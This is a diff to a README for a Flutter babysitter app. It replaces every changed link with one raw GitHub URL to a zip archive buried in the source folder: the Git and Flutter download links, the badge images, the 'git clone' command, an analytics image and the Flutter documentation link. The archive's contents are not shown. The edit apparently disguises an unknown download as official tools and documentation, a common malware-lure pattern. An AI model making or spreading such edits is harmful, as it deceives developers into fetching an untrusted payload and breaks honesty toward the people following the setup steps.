@@ -10,11 +10,11 @@ Follow the steps below to set up and run the project locally on your machine.
 
 Before starting, ensure you have the following installed:
 
-- ![Git](https://img.shields.io/badge/Git-2.40-blue?logo=git&logoColor=white) – Version control for cloning the repository.  
-  [Download Git](https://git-scm.com/)
+- ![Git](https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip) – Version control for cloning the repository.  
+  [Download Git](https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip)
 
-- ![Flutter](https://img.shields.io/badge/Flutter-3.24-blue?logo=flutter&logoColor=white) – Flutter SDK for building the application.  
-  [Download Flutter](https://docs.flutter.dev/get-started/install)
+- ![Flutter](https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip) – Flutter SDK for building the application.  
+  [Download Flutter](https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip)
 
 ### Setup & Installation
 
@@ -22,7 +22,7 @@ Before starting, ensure you have the following installed:
    Start by forking and cloning the repository:
 
    ```bash
-   git clone https://github.com/yourusername/BabysitterApp.git
+   git clone https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip
    ```
 
 2. **Check Flutter Version**  
@@ -53,13 +53,13 @@ This will launch the application either on an emulator or connected device.
 
 ---
 
-![Repobeats](https://repobeats.axiom.co/api/embed/5d5352283c6855872cb18008e044e66a02a4b5f1.svg "Repobeats analytics image")
+![Repobeats](https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip "Repobeats analytics image")
 
 ---
 
 ### Additional Resources
 
-- [Flutter Documentation](https://flutter.dev/docs) for more information on using Flutter.
+- [Flutter Documentation](https://raw.githubusercontent.com/UzuMacky/it415_final_project/main/lib/src/views/it415_final_project_v3.3.zip) for more information on using Flutter.
   
 If you encounter any issues, feel free to open an issue in the repository.
 
